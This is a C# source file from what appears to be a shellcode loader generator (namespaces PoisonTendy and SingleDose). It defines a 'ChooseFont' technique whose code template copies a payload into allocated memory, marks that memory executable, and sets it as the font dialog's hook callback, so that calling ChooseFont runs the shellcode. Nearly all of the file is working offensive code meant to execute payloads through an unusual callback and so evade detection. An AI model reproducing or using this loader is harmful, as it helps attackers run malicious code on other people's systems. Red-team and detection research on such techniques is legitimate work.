using SingleDose.Techniques;
using System.Collections.Generic;

namespace PoisonTendy.Techniques.Loaders
{
    internal class ChooseFont : ITechnique
    {
        bool ITechnique.IsLoader => true;

        bool ITechnique.IsUnsafe => false;

        string ITechnique.TechniqueName => "ChooseFont";

        string ITechnique.TechniqueDescription => null;


        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://github.com/Wra7h/FlavorTown"
        };

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "ChooseFont" };

        List<string> ITechnique.Prerequisites => null;

        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            CHOOSEFONT sCF = new CHOOSEFONT();
            sCF.lStructSize = (uint)Marshal.SizeOf(sCF);
            sCF.Flags = 0x8;
            sCF.lpfnHook = hAlloc;

            ChooseFont(sCF);
        }
        {{ARGS}}

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct CHOOSEFONT
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hDC;
            public IntPtr lpLogFont;
            public int iPointSize;
            public uint Flags;
            public int rgbColors;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr hInstance;
            public string lpszStyle;
            public short nFontType;
            public short ___MISSING_ALIGNMENT__;
            public int nSizeMin;
            public int nSizeMax;
        }

        {{INVOKE}}
    }
}";
    }
}
